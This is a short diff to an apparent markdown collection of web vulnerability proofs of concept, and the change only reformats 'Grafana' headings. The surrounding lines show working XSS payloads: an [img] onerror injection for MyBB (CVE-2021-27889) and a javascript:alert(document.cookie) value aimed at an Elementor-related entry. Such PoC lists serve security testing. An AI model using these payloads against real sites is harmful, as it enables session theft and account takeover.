@@ -1,3 +1,5 @@
+#Grafana:
+
 **(CVE-2021-27889)** MyBB forum stored XSS POC: ``[img]http://xyzsomething.com/image?)http://x.com/onerror=alert(1);//[/img]``
 
 **(CVE-2021-24175)** WP plugin Elementor Page Builder:
@@ -16,7 +18,7 @@ info:
     email: "javascript:alert(document.cookie)"
   version: "1.0.1"``
 
-######Grafana:
+#Grafana:
 
 **(CVE-2019-15043) Unauthenticated API access:**
 
